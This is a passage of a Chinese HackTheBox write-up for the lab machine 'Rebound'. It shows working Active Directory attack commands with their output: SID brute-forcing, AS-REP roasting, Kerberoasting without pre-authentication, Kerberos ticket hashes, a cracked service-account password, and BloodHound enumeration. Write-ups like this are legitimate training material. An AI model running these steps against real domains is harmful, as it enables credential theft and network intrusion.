<p>只有Shared共享可用——尽管它是空的。考虑到可以匿名登录，尝试通过Impacket的lookupsid.py枚举用户，它使用暴力查找现有用户的<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mtc2VydmVyL2lkZW50aXR5L2FkLWRzL21hbmFnZS91bmRlcnN0YW5kLXNlY3VyaXR5LWlkZW50aWZpZXJz">安全标识符(SID)<i class="fa fa-external-link-alt"></i></span>。它通过循环遍历相对标识符(rid)来实现这一点，rid与域的SID连接以形成整个SID。根据参考文档:</p>
<p><em><strong>对于域帐户，通过将域的SID与帐户的相对标识符(RID)连接来创建安全主体的SID。</strong></em></p>
<p>运行impacket-lookupsid，在目标IP地址前加上任意的用户名:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2541]</span><br><span class="line">└─[$] impacket-lookupsid nan@10.10.11.231 -no-pass                                                                                                   [20:24:28]</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.11.231</span><br><span class="line">[*] StringBinding ncacn_np:10.10.11.231[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: rebound\Administrator (SidTypeUser)</span><br><span class="line">501: rebound\Guest (SidTypeUser)</span><br><span class="line">502: rebound\krbtgt (SidTypeUser)</span><br><span class="line">512: rebound\Domain Admins (SidTypeGroup)</span><br><span class="line">513: rebound\Domain Users (SidTypeGroup)</span><br><span class="line">514: rebound\Domain Guests (SidTypeGroup)</span><br><span class="line">515: rebound\Domain Computers (SidTypeGroup)</span><br><span class="line">516: rebound\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: rebound\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: rebound\Schema Admins (SidTypeGroup)</span><br><span class="line">519: rebound\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: rebound\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: rebound\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: rebound\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: rebound\Protected Users (SidTypeGroup)</span><br><span class="line">526: rebound\Key Admins (SidTypeGroup)</span><br><span class="line">527: rebound\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: rebound\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: rebound\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: rebound\DC01$ (SidTypeUser)</span><br><span class="line">1101: rebound\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: rebound\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1951: rebound\ppaul (SidTypeUser)</span><br><span class="line">2952: rebound\llune (SidTypeUser)</span><br><span class="line">3382: rebound\fflock (SidTypeUser)</span><br></pre></td></tr></table></figure>

<p>返回少量用户，因为在默认情况下，impacket-lookupsid将RID的最大值设置为4000。将这个限制增加到10000，并再次运行这个工具:</p>
<p>现在看到rid最多为7687的用户，这提供了大量的用户名样本。将所有的SidTypeUser条目保存到一个文件中，以供以后使用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid nan@10.10.11.231 10000 -no-pass | grep <span class="string">&#x27;SidTypeUser&#x27;</span> | sed <span class="string">&#x27;s/.*\\\(.*\) (SidTypeUser)/\1/&#x27;</span> &gt; usernames.txt</span><br><span class="line"></span><br><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2542]</span><br><span class="line">└─[$] <span class="built_in">cat</span> usernames.txt                                                                                                                              [20:32:18]</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC01$</span><br><span class="line">ppaul</span><br><span class="line">llune</span><br><span class="line">fflock</span><br><span class="line">jjones</span><br><span class="line">mmalone</span><br><span class="line">nnoon</span><br><span class="line">ldap_monitor</span><br><span class="line">oorend</span><br><span class="line">winrm_svc</span><br><span class="line">batch_runner</span><br><span class="line">tbrady</span><br><span class="line">delegator$</span><br></pre></td></tr></table></figure>

<h1 id="AS-REP-Roasting-with-Kerberoasting"><a href="#AS-REP-Roasting-with-Kerberoasting" class="headerlink" title="AS-REP-Roasting with Kerberoasting"></a>AS-REP-Roasting with Kerberoasting</h1><p>现在尝试识别易受AS-REP-roasting攻击的用户。在配置帐户时不要求Kerberos预身份验证，从而允许攻击者为这些用户请求加密的票据授予票据(tgt)，而不需要用户的密码，就会出现此漏洞。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==">Impacket<i class="fa fa-external-link-alt"></i></span>的GetNPUsers.py工具可以为具有UF_DONT_REQUIRE_PREAUTH属性的用户检索票授予票(tgt)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2543]</span><br><span class="line">└─[$] impacket-GetNPUsers -usersfile usernames.txt rebound.htb/ -dc-ip 10.10.11.231                                                                  [20:34:38]</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[-] User Administrator doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User Guest doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] User DC01$ doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User ppaul doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User llune doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User fflock doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:95d51957aa3771dacc1664c6236c4055<span class="variable">$d434f84d1d47433e95073960ed2980c385ae8f830686ef69bc2c0d9b23e197a2901986f89105ff750b722e9cb7086ad9d13c924e41e182cc4e8e0e646838397aa50e33c6356b24f860b4791cdaec04d57bc3f2734ab7749e42073aadfb097ea24a55dd4ae56f68d7f8cba78d1cdb8dcbeedb63f6c11dd6a813d6729a8c76666d9ff687a06b84fb1e6abdb4b92c9b372f44f0c8682f3f36dec2118efa0b81952041c2d180a8ebe0c77d47ea5da4344d1897d1f5b3b92e1618a39ebb94c0e55c457f84d5952f226890e2b1091dc656eb1e1ff16cbf4bb5a288683ea55e64c9491212260953e3574dfd0b9b</span></span><br><span class="line">[-] User mmalone doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User nnoon doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User ldap_monitor doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User oorend doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User winrm_svc doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User batch_runner doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User tbrady doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User delegator$ doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br></pre></td></tr></table></figure>

<p>jjones返回一个加密的TGT。不幸的是，它似乎无法破解</p>
<p>最近的<span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VtcGVyaXMuY29tL2Jsb2cvbmV3LWF0dGFjay1wYXRocy1hcy1yZXF1ZXN0ZWQtc3RzLw==">New Attack Paths? AS Requested Service Tickets<i class="fa fa-external-link-alt"></i></span>表明，可以利用AS-REP-roastable用户来执行Kerberoasting，而无需预身份验证:</p>
<p><em><strong>但是，对于Kerberoasting，不需要访问会话密钥。只需要生成的ST，或者更准确地说，不使用请求帐户密钥保护的ST的加密部分。因此，如果将任何帐户配置为不需要预身份验证，则可以在没有任何凭据的情况下进行Kerberoast。</strong></em></p>
<p>对这种攻击的支持是在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC9wdWxsLzE0MTM=">Support for Kerberoasting without pre-authentication and ST request through AS-REQ #1413<i class="fa fa-external-link-alt"></i></span>中提交的，并且已经合并到当前的Impacket主分支中，但在本文时还没有作为正式版本推出。因此，将使用一个支持这种攻击的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RoZVBvcmdzL2ltcGFja2V0">impacket github分支<i class="fa fa-external-link-alt"></i></span>，以及本文后面需要的其他一些攻击操作。所有与impack相关的命令都将使用此版本的工具执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv impacket-fork</span><br><span class="line"><span class="built_in">source</span> ./impacket-fork/bin/activate</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ThePorgs/impacket.git</span><br><span class="line"><span class="built_in">cd</span> impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>现在，可以使用GetUserSPNs.py的-no-preauth选项来请求票据授予服务(Ticket Granting Service, TGS)票据，使用jjones的加密TGT</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(impacket-fork) [root@kali ~ ]$ GetUserSPNs.py -no-preauth jjones -request -usersfile /root/hackthebox/machine/rebound/usernames.txt rebound.htb/ -dc-ip 10.10.11.231</span><br><span class="line">/root/impacket-fork/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1+20231106.134307.9aa93730&#x27;</span>, <span class="string">&#x27;GetUserSPNs.py&#x27;</span>)</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">$krb5tgs$18$krbtgt<span class="variable">$REBOUND</span>.HTB$*krbtgt*$b7f4495dad8442753f659146<span class="variable">$228b6f2a0f7a0b5319fe1c223e915352d84fa0fd83915cfe9d57a41915382f4413af126465af63450eff3f05284915e8dcbf94af88b3888cacdcac941de7981f3aa5246439f4186434e91be539bbefc017b1a6a13b07f996ae068586469ba1b8cfffb1091eeb7ed5480623478bd25e66c26d8893a1eff939d7f475549866856701801e2bdde297cf4030a0131532261136f738dff5d0e77fae4da3c64c9e5589a1a4349b88c7b97b75621350a0e6fe2d191c7b7a52dbc478e9442da0e4008007838cb14695bcc7a98bdb7c68a70fce74d5748fd13d017235cb451326443f100642e6c09570df22795bca436d292b3014e8d10a0c3fbb50911e6b88bb66b2232420d0eaace34f6aaf9847f5e684380de41ae1b70f4a975fa0acf8b2b5dbebff865232a3aba195f72dac905dba0ea55182f10cd6ccda43978273a4fae20b424c4414a2cd6b1e385637759db2a8e832e1d0e4c44207d97c16acad3e20e32b6b46d256023d8641207a419ca9fb23fcb995adfda0394405bb77a8d4d3d8a4ba22ae2370f7fa93b84827e4496537b22170d9f8af84b3c591a1759873114b6d4de1f984e25a2cd70e34a4bc33b956c74185aab15d844dda9f9b391bd0a017d3c836df34b7c9312a943e91dc956d20661fe752b4763dc2ed6a3e5bfb7d09f1546fd04b6d8577bce8781904491428db21c4e7acf83a359187f44b3bccca0e8c40dcef5541f1ffc767156411d96f6cf1746783b893605779d888b5ee1965a16d6304bac92942a95c66823af762bb8572ccb2ac1382f9002f3eb73ba82cafa13a5ee71fbd720ed8f966a03f5bc67201115a3a1c48db47177a9f4b95937191c42d33b14663e4d4c5d5093b523f92bd82d4087805e0c4c40cef24e63a3219d9a220a74dbb127bd29548a3d7c7c51475dd01feda149b79a1c2f0fdd4dfa40f24db7384bca5057dbf75b552b80551fddf73af319ee5afa5f88420e93e8e04247d3829105d00486424971b0b323da8cdbfc0d110ce1773346bfe2a0cd8b045b978848a48ae3b5d448f3baa4efbef9dcf337238211891e148a7f4d329f98f80039a926a25104e0211bfae00a1ba047897d9ad6149ae47031884879271cae4ee75b59fad20a90313ebc3bcf52002a8cca08a33282d809d5b52a5a5a49c7177161b760f3ed0b6178efbea5bd913efd2a941cba7a9458ab179f875a33447693664ce1ee28baa1cd5ea0fe48cb7b13411a953c5f78a9cce432028a67752a4734527898d74db5416390011305a2907fd2e8f5b38b4b647e32280ad835ad19bc5c1dc86f2f39e28ce305839365bc13e02b0b91ce0de3434f17056a3f68d2ebd62ca9bd3ab1a88f49769e75ae1cb38dd42ae74707f9af972bb068562d91ef79d7c335e5fa2b438778b9ab00f297899361591be01b1ebc128b37dff595e8bb1e0f028f9c7632b012d352e81c0b5660c2a6ef0a1a42967b7fae4c1abd09279</span></span><br><span class="line">$krb5tgs$18$DC01$<span class="variable">$REBOUND</span>.HTB$*DC01$*$676eaed2d439c42a6527e613<span class="variable">$edbd46f85fd04d663029ae0f38a60b6c4387f102e74f1c6f7afb3bcf7cfaf403315e95c3d44cfe92ad358163b825a5ec208914a3c57de024598f67a0e22c81cc12503d0d3d5c30d0af43fd829bad743551438c0ba471470f87f1d0d9b0f3679f5579698d805d16042bcf109d7eda65e2f7d11f82fb62fef7e437dc9a9f26ea6043475bab07bdc9f6ddd824550085b1fc4dfa5b8751efabf603c8b435f76c598cc492e0d01915068ea6137ada5233bd8446e81878206f757c1562e71ff7821c546a81117a5b7a0af14092f392d652c480236cc0c88a35dbe34ca858c5150756d6d75035265124659f99e107776d976b7b9cc93d1b6deba493c20e7782ce69f12a344b0559ba2a0db7a2febe7da4daa6d90f36f97250ce16191a758ee264a7c16803baafe2f767724c0f7c87525378ab80f7c63fdcf2ea6b27e1a7b7c774597f56efc798443e280621eb7506b12a54ece0cbca159f301767c76d97503b87c9a448d846901cbff3d2d28377b91a979e5349a591f11f23420853cd328b7446d13c60b1eeb701711fbe10cadbc13c6a35f5eed5de082adc6f2d20a4a7843c777a6709747c13bedaa1f3324bfce2f3593b3190c39afcce51426f8a1eff6c773d0100388505cffb856c083ece4f6331d06d1a57124bf220b639ac2c2dda020fc164845f9e53a529c7e135cdcfca76952b7ea35a463a04087f9af87e0fa025e033d3c986736c44dfa2f380b865e0ff970ad40abe53b9c8f1e166a7feea936fa9ff886217e50f8f8b4a55fc01bf26914c419adec47233c47a9bcf851aaf0c1f9c2e345459fe5ab037d6cbe457ff89e215ff91b8777b5e39422c5a884746e3176711897dae50f7ef0ccb6ff68ee602bf12902a2fb498f5e83196f9e1f9b07670c3264c2cd86161190e74563acd4140f2423b40a7436a0660338613796562de436a7a8445d5bdc5916873da5368749e9562317ff6f11e984b785a6dd96033270955599b0cd07cd6056a8ae4ae2a77402066306feed7280f063e7917df669a6abad3dec14ad87251a1145a6c3b3db3d4eb9e889846bc3a8daa27eac9dd0c144f90de20b6c258f47321bf7505bc290d0d4d719ff2438fd3b123dcaaa2be8f57e8d0596a11cc0b4f0e91c2950daf39a4cf712f40f23c9506cee7000b8a3ed18002d79b0abe23c26e3a4ac586f5a9f075f8e7ea41e8d0f3c51aae863c6ecdcbb46442f8283d8c8e9e30dbb975024b1ccf485fa537e970945f9600230b7cc794cdd395efa6c2ebd270f8a60af6aaa4a1c6403dd42286ea15a3d80b7e810628cdb8f75783fecc0493218fc934ae89f0687cac4e09982d8e5716a30c05e67986892448f2528d3dd6291c282e82db4a131924e6</span></span><br><span class="line">[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">$krb5tgs$23$*ldap_monitor<span class="variable">$REBOUND</span>.HTB<span class="variable">$ldap_monitor</span>*$20941b976672bf739ab097ba01a8cfae<span class="variable">$3a4367ed51eb98246925df381ddaf352c124bead33075606510e7a0a879a6a76ec2bdafc4cc5db9427d4ff5985a646b0bd20f666ab3e174dde613f4a9edd67c3d50631955fc2eb3fd69750a1c4da1642c9100bb187ab841ebe4766366462dd0fea6c8e05b14e862360ee97cd7637f3264ff4f3415eb353431cf8d8aed45afec6a3aaacf1e39dce01ef657213a50da924deca54853452d861fbc108ee0e49ecda8d698941b0d7151b3800149ef9937b668a9e76af6274f5e8c172dddfc916c53dd6e520b7e0edf95ab20729ad7f85ffeb218664f8dfd03a9c5addc226d3aba6ef054d2029c73c39cc3ca0fc895b329a9db84f699ef31b4fed7843749370971bbacc5f829b3721d16d182370ebcb728953d538cca54f908e0d5eb918eaeff7f2e2ee0b770736ccfb9aad2f725374c9057c9b8cb61d6cd262a93d997e1de62fe5c4a6b5c2bf80dd1bc8e4f82725516ab85a78d98fb87fcb7f78d61602f43f9b53c7463d7158d37f482c02178ef798b3b1badb4ae89e95f10363e82b373dd7d108f71c67768ce64a48388023190d0f7e6696946ad17ad5c3f3858081956f4ceae07da4fd80ccf6ef3b611a76fd51cf487fd3125f6c5e8ba9bc9c07f5fa1c1b1118af320d63425fdc28131b61bf1a5a6bc44b99506da168037a00dea3012d23818e1bf91cbe5bf6f4bae50d243d9a1b71a8de4cdace5c6b9557fb1c732b24507c41d1270f15e604fe7d4ca35b362e09bb75f41a8c070d9bc226e19ce50fa03e30f0907e43da8b063d0400fbb73494e010e7458a3d17e1b8cdd71e10d375a739bc47ef68234068caefafb4d932d755cef4f0c15a0883f35655fb552bb8157c54ab991773e6f349239abd8b0465e6a1c3710e34053b83a5e678b6c151162e1898f602579c85493a4561118e13b54245a8f11ac0e4e1515c8e49c3cf808fe3909b82d85b9ed08adf8fd8d7cdbcdd8419df7db382fb83c1b60ac147911cc1e36ec25daa024afa64d4b0b494271750157fc95cbb39bfa0d9f8f82bd2ca72a5b532b93423ed4e18548f622d0b58e75b15f474b13a167fe18a599dd2b85d0089598652b90d7143ed144dc87debf95ed91e9230ec9762649e1b684a3a2933eafc6e05cfa9c1c0beb61cbe0669bcc148dcc484a7b1f07c83c18203360efdc059f81dff14fcc5fea703f9eaaa51a1e7dec1e363d943c14965d14e76928f98c44e4882ecb4f990a6579e9fd031c50df44bc79fd68d79047c94f9eb8e6ccc1c77816d30ee6102309719e376309ad74ed19ca621e686a33277377b71e36d5d2e4163b352c846b5208f7ea97d2fa1f59b5ebbccc4b044c8b3f22b59192040530931ccc63c1607c1c35e04c0</span></span><br><span class="line">[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">$krb5tgs$18$delegator$<span class="variable">$REBOUND</span>.HTB$*delegator$*$6cab342633ff628cfcfac8c4<span class="variable">$71fd68ad65f56c75f181aa22d1e803a739ff8f633f1096e1c59ac72c0cdaff8432bace2027c335b971a24d5f417ee30075f2996b2ae2e48698f9b30c9ba04891cb3ecffaba2f57aad6f6cee7a53aac3c301a6ba5689bae2c54a9ccc7f58d670ecebcac2234d0d22e5cfb48d4adc534fde9822464b980ee548ec9fecd7a42a225679fd2ec52bab1b0af038e2844489f2d2925e1b46dffed03e72fed1efcd84fb40029c17afec70e279209ca1383c9549bcdc80ab1f4aaa33f7665de2cef404ad8c3922bd1fcdd60371c8f0dbc72c65db6a40837cc6fae06c20a1999689788e67ea1a4cc7ec0ebff158090aeb2a8a2aaa64b3c6cf07c3a5dd84356f0733ae208ca4087f16f92306775f427e2fa11d4df609be59b58112177cba564bff5361f973693274529f5dac04139e8208467364d2b87404dc9cdda9daf3bf31eb53484d5afd414a7e3e4340d307079561b03b6bcce1547f4605ca96b5e1599d5681f2779222465ebae5911e3433208d3bc43240f77a3a757e02a7bdcbcf49d265622f85f2e525f902867665828d53768e169b0185548a7ddb7721541f974730b983fdb9b01ccb04561ac86264479c4e55a21cc51a39e36df0aeaa3cd983ecb453e964bc5b645211b6c0658188696a8ebc909999530b582ae8f3efa44924a86c4d705e473196d4edd1617a641f683cd4a7b8ff5436981d7b39d03a8bf189b238256ea7160f28bdb126a47f0dba95883d7c8f8e8e5acbc5562f8a08aa04ec03064b6bb215065f03028003f60782e5898b00f70086ab2a7718e3d382d8ffc73116b7ff2accba494b67bbbf0b7b0d1022ec0a7a00d78280380d208c8032edfd7d0e2bda779a4b4d513d90ac9c3395516bfd6fabe73ef6804d0a07c1bfe75b1a639fd671246ea4447cbeb392178382fee5321a2db0ce5dfabdb4d35e87c23b3668335a68bcaa9d22c45fedc9bc7b15af986196ff8353f618822e1fce7a07b85c38d20a19602a1b12d4bca45b92c671349073c629154aac7884cd7597ab80ccde050d6c349c280f7a9de6da94404b7600b0a55eefb2b132a093bd7574d367bb79e7bea8263a88882de510cf8d0e534678dddc6ab81dff055f1e56a1944f11a5a8a5b2e9ec20342cd1460544f63f1dbb6698dfd40a746828a8beded8056cb50765bb1dcffe8524536747556e2b3cf977aa32852c6579066383408c3917cc325a34d66f0c5f556d937dd7981485193a999fc669c756f4eb6ba354bac985ceb870e647a14e8afd70b1e52ec011ebb6c0f7b1b9e00e9b2f2548d0245185eedc967073c4f7f7b8ebc5c7775d4f1410e81f8999cfde4af7a61094d25d905b6800c7470d7e2324c01053e62cb20d5b10ac090c76d91</span></span><br></pre></td></tr></table></figure>

<p>该命令成功运行并产生许多票据，包括ldap_monitor和delegator$的票据。做出一个有根据的猜测，DC01、krbtgt和delegate$票证是不可破解的，因此将重点放在ldap_monitor票证上。</p>
<p>将其保存到一个文件中，并将其提供给john:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2556]</span><br><span class="line">└─[$] john <span class="built_in">hash</span> --show                                                                                                                               [20:59:33]</span><br><span class="line">?:1GR8t@$<span class="variable">$4u</span></span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></table></figure>

<h1 id="Bloodhound-amp-Powerview"><a href="#Bloodhound-amp-Powerview" class="headerlink" title="Bloodhound &amp; Powerview"></a>Bloodhound &amp; Powerview</h1><p>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0Jsb29kSG91bmQucHk=">bloodhound.py<i class="fa fa-external-link-alt"></i></span>远程枚举目标AD环境。调整集合查询(-c)以排除ObjectProps，因为它似乎会导致工具失败。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.5.png"></li>
</ul>
<p><em><strong>Bloodhound的复杂性超出了本文的范围，但可以在HTB的<span class="exturl" data-url="aHR0cHM6Ly9hY2FkZW15LmhhY2t0aGVib3guY29tL2NvdXJzZS9wcmV2aWV3L2FjdGl2ZS1kaXJlY3RvcnktYmxvb2Rob3VuZA==">Active Directory Bloodhound<i class="fa fa-external-link-alt"></i></span>模块中获得。</strong></em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.png"></li>
</ul>
<p>Bloodhound没有透露太多信息，但是，发现ServiceMgmt在Service Users组织单元(OU)上具有GenericAll，这可能导致<span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0LmJsb29kaG91bmRlbnRlcnByaXNlLmlvL2hjL2VuLXVzL2FydGljbGVzLzE3MzEyMzQ3MzE4MDQzLUdlbmVyaWNBbGw=">Descendant Object Takeover (DOT)<i class="fa fa-external-link-alt"></i></span>。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound2.png"></li>
</ul>
<p>然而，首先，需要找到一种方法来成为组的一部分或妥协组中的用户。<br>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuaXFmYWtocnVsL3Bvd2Vydmlldy5weQ==">powerview.py<i class="fa fa-external-link-alt"></i></span>进行进一步的枚举。</p>
<p>这表明LDAP通道绑定设置被设置为”Always”，导致服务器放弃来自不提供令牌的客户端的任何连接。对于想要对LDAP&#x2F;LDAPS执行的任何查询，也会发生这种情况。</p>
<p>通过-k标志绕过Kerberos身份验证的这个约束。</p>
<ul>
<li>确保系统时钟与服务器时钟同步，以便Kerberos正常工作:</li>
</ul>
